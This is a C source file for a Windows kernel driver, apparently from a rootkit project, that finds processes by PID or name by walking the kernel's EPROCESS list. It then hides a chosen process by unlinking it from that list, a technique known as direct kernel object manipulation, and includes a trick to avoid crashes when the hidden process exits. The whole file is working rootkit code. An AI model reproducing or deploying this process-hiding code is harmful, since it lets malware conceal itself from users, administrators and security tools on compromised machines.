#include <stdlib.h>
#include "Ntifs.h"
#include "ntddk.h"
#include "deadlands.h"
typedef unsigned long DWORD, *PDWORD, *LPDWORD;

PEPROCESS		DKOM_SearchProcessByPID(IN long pid)
{
	PEPROCESS		foundProc;
	/* ANOTHER WAY TO FIND PEPROCESS VIA PID
	if (PsLookupProcessByProcessId ((PVOID)pid, &foundProc) == STATUS_SUCCESS) {
		DbgPrint("PID %ld found for '%s'", pid, (char*)((char*)foundProc + EPROCESS_OFFSET_IMAGENAME));
		return (foundProc);
	}
	*/
	PEPROCESS		saveProc;
	PEPROCESS		currProc;
	PLIST_ENTRY		list;
	long*			tmp = NULL;

	saveProc = IoGetCurrentProcess();
	currProc = saveProc;
	do {
		tmp = ((unsigned char*)currProc + EPROCESS_OFFSET_PID);
		//DbgPrint("[%s] %ld (0x%X) == %ld (0x%X)", (char*)currProc + EPROCESS_OFFSET_IMAGENAME, pid, pid, *tmp, *tmp);
		if (pid == (*tmp)) {
			DbgPrint("Process %ld found '%s'", pid, ((unsigned char*)currProc + EPROCESS_OFFSET_IMAGENAME));
			return (currProc);
		}

		list = (PLIST_ENTRY)((unsigned char*)currProc + EPROCESS_OFFSET_ELIST);
		currProc = (PEPROCESS)list->Flink;
		currProc = (PEPROCESS)((unsigned char*)currProc - EPROCESS_OFFSET_ELIST);
	} while (saveProc != currProc);

	return (0);
}

PEPROCESS		DKOM_SearchProcessByName(IN char* procName, IN int lenName)
{
	PEPROCESS		saveProc;
	PEPROCESS		currProc;
	PLIST_ENTRY		list;

	saveProc = IoGetCurrentProcess();
	currProc = saveProc;
	do {
		if (strncmp(procName, ((unsigned char*)currProc + EPROCESS_OFFSET_IMAGENAME), lenName) == 0) {
			DbgPrint("Process %.*s found with uPID:%ld", lenName, procName, *((unsigned char*)currProc + EPROCESS_OFFSET_PID));
			return (currProc);
		}

		list = (PLIST_ENTRY)((unsigned char*)currProc + EPROCESS_OFFSET_ELIST);
		currProc = (PEPROCESS)list->Flink;
		currProc = (PEPROCESS)((unsigned char*)currProc - EPROCESS_OFFSET_ELIST);
	} while (saveProc != currProc);

	return (0);
}

NTSTATUS	DKOM_HideProcessByName(IN char* procName, IN int lenName)
{
	PEPROCESS		tmpProc;
	PLIST_ENTRY		lstHide;
	PLIST_ENTRY		lstNext;
	PLIST_ENTRY		lstPrev;
	
	tmpProc = DKOM_SearchProcessByName(procName, lenName);
	if (tmpProc == 0)
		return (STATUS_NOT_FOUND);

	lstHide = (PLIST_ENTRY)((unsigned char*) tmpProc + EPROCESS_OFFSET_ELIST);
	
	lstNext = lstHide->Flink;
	lstPrev = lstHide->Blink;
	lstNext->Blink = lstPrev;
	lstPrev->Flink = lstNext;
	
	// This trick avoid crash of BSoD on exiting process
	lstHide->Blink = lstHide;
	lstHide->Flink = lstHide;
	
	return (STATUS_SUCCESS);
}

NTSTATUS	DKOM_HideProcessByPID(IN long procPID)
{
	PEPROCESS		tmpProc;
	PLIST_ENTRY		lstHide;
	PLIST_ENTRY		lstNext;
	PLIST_ENTRY		lstPrev;
	
	tmpProc = DKOM_SearchProcessByPID(procPID);
	if (tmpProc == 0)
		return (STATUS_NOT_FOUND);

	lstHide = (PLIST_ENTRY)((unsigned char*) tmpProc + EPROCESS_OFFSET_ELIST);
	
	lstNext = lstHide->Flink;
	lstPrev = lstHide->Blink;
	lstNext->Blink = lstPrev;
	lstPrev->Flink = lstNext;
	
	// This trick avoid crash of BSoD on exiting process
	lstHide->Blink = lstHide;
	lstHide->Flink = lstHide;
	
	return (STATUS_SUCCESS);
}
